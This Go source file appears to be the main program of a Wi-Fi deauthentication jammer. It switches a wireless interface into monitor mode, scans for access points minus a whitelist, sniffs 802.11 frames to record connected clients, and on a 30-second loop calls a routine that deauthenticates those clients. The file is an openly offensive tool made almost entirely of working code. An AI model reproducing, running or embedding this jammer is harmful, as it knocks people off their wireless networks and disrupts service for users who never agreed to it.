package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)


var QuitSIGINT = false

func help() {
	fmt.Printf("useage: ./%s <util iface> <mon iface> <whitelist>\n", os.Args[0])
	os.Exit(1)
}

func handleSignals() {

	sigc := make(chan os.Signal, 1)
	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitSIGINT = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func checkComms(dot11 *layers.Dot11, rtap *layers.RadioTap, aps *List) bool {

	var fromCli = false
	var rHdr *layers.RadioTap = nil
	var	dotHdr *layers.Dot11 = nil
	var cliAddr net.HardwareAddr
	var apAddr net.HardwareAddr
	var client *Client

	// If this message originated from the client
	if dot11.Address1.String() == dot11.Address3.String() {
		apAddr = dot11.Address1
		cliAddr = dot11.Address2
	} else {
		cliAddr = dot11.Address1
		apAddr = dot11.Address2
		fromCli = true
		rHdr = rtap
		dotHdr = dot11
	}
	if a, ok := aps.Get(apAddr.String()); ok {
		ap := (*a).(Station)
		if client = ap.GetClient(cliAddr); client == nil {
			client = new(Client)
			client.hwaddr = cliAddr
		}
		if fromCli {
			client.dot11 = *dotHdr
			client.radioHdr = *rHdr
		}
		//fmt.Println(*client)
		ap.AddClient(*client)
		aps.Add(ap.hwaddr.String(), ap)
	}
	return false
}

func main() {

	if len(os.Args) < 4 {
		help()
	}
	handleSignals()
	utilIfa, err := NewJamConn(os.Args[1])
	if err != nil {
		log.Fatalln("NewJamConn() ", err)
	}
	defer func(){
		if err := utilIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close() ", err)
		}
	}()
	monIfa, err := NewJamConn(os.Args[2])
	if err != nil {
		log.Fatalln("NewJamConn() ", err)
	}
	defer func(){
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close() ", err)
		}
	}()
	if err := monIfa.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
		log.Fatalln("JamConn.SetIfaType()", err.Error())
	}
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err = monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err = monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}
	if err := monIfa.SetDeviceChannel(1); err != nil {
		log.Fatalln("JamConn.SetDeviceChannel()", err.Error())
	}
	whiteList := getWhiteListFromFile()
	apList, err := utilIfa.DoAPScan(&whiteList)
	if err != nil {
		log.Fatalln("doAPScan()", err)
	}
	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
	monIfa.SetLastChanSwitch(time.Now())
	monIfa.SetLastDeauth(time.Now())
	for !QuitSIGINT {
		packet, err := packSrc.NextPacket()
		if err != nil {
			if err.Error() != "Timeout Expired" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
			}
		}
		if packet != nil {
			radioTap := packet.Layer(layers.LayerTypeRadioTap)
			data80211 := packet.Layer(layers.LayerTypeDot11)
			if data80211 != nil && radioTap != nil {
				rTap := radioTap.(*layers.RadioTap)
				dot11 := data80211.(*layers.Dot11)
				checkComms(dot11, rTap, &apList)
			}
		}
		if err := monIfa.DeauthClientsIfPast(time.Second * 30, &apList); err != nil {
			log.Fatalln("JamConn.DeauthClientsIfPast()", err)
		}
	}
		//monIfa.ChangeChanIfPast(time.Second * 2)
}

